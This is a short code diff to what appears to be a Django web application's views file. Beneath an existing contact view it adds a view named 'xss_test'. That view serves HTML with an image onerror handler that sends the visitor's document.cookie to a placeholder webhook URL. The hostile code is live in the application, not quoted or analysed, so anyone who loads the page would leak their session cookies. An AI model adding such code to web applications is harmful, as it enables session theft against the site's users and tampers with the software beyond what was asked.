@@ -42,3 +42,17 @@ def contact(request):
         return render(request, 'contact.html', {'success': True})
 
     return render(request, 'contact.html')
+
+from django.http import HttpResponse
+
+def xss_test(request):
+    return HttpResponse("""
+        <html>
+        <body>
+        <h1>XSS Test</h1>
+        <img src="x" onerror="fetch('https://your-webhook-url.com?c='+document.cookie)">
+        </body>
+        </html>
+    """)
+
+
